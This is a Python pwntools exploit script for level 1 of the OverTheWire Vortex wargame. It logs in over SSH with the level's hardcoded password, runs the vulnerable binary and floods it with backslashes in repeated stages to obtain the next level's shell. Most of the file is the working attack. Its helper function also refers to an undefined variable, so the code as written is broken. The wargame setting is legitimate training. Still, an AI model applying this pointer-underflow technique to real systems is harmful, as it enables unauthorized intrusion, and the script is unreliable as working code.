#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 1
USER = 'vortex%s' % level
HOST = 'vortex.labs.overthewire.org'
PASS = 'Gq#qu3bF3'
PORT = 2228

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT, timeout=600)
    return sh

def execute_payload(sh):
    time.sleep(0.05)
    w = log.progress("Executing vortex1")
    shell = sh.run('/vortex/vortex1')
    b = log.progress("Sending backslashes")
    #shell.sendline("\\"*889192448)
    for i in range(0, 50):
        b.status("Stage " + str(i))
        send_backslashes(shell, i, b)
    w.success("vortex2 shell established")
    shell.interactive()

def send_backslashes(sh, stage, b):
    sh.sendline("\\"*11783849)
    b.status("Stage " + str(stage) + "("+ str(i-1) + " complete)")

def local_payload():
    binary=ELF("vortex1alt")
    p = binary.process()
    p.sendline("\\"*889192448)
    p.interactive() 

#local_payload()

sh = connect_to_level()
execute_payload(sh)
